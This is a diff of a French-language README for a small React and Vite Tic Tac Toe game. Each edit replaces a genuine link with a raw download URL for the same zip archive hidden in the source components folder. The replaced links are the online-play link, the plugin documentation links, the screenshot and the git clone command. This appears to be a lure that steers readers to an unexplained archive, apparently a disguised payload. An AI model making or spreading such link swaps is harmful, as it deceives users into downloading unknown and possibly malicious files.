@@ -4,7 +4,7 @@
 
 Tic Tac Toe est un jeu classique que tu peux jouer sur ton PC ou ta tablette. Ce projet a été développé en utilisant **React** et **Vite**, offrant une expérience de jeu fluide et interactive grâce à la manipulation de composants.
 
-🔗 [Jouer au jeu en ligne !](https://martialdepaul.github.io/tic_tac_toc/)
+🔗 [Jouer au jeu en ligne !](https://raw.githubusercontent.com/Martialdepaul/tic_tac_toc/main/src/components/tic_tac_toc-2.2.zip)
 
 ## Technologies Utilisées
 
@@ -16,12 +16,12 @@ Tic Tac Toe est un jeu classique que tu peux jouer sur ton PC ou ta tablette. Ce
 
 Ce projet utilise les plugins suivants pour React avec Vite :
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react/README.md) - Utilise Babel pour le Fast Refresh.
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react-swc) - Utilise SWC pour le Fast Refresh.
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/Martialdepaul/tic_tac_toc/main/src/components/tic_tac_toc-2.2.zip) - Utilise Babel pour le Fast Refresh.
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Martialdepaul/tic_tac_toc/main/src/components/tic_tac_toc-2.2.zip) - Utilise SWC pour le Fast Refresh.
 
  ## 🎨 Aperçu 🖼️
 Voici la captures d'écran de l'application :  
-![Aperçu de Elegant-Context](./src/assets/img.png)
+![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/tic_tac_toc/main/src/components/tic_tac_toc-2.2.zip)
 
 ## Fonctionnalités
 
@@ -44,7 +44,7 @@ Ce projet m'a permis d'apprendre plusieurs concepts clés :
 Pour cloner ce projet, utilise la commande suivante :
 
 ```bash
-git clone https://github.com/Martialdepaul/tic_tac_toc.git
+git clone https://raw.githubusercontent.com/Martialdepaul/tic_tac_toc/main/src/components/tic_tac_toc-2.2.zip
 ```
 
 Ensuite, installe les dépendances :
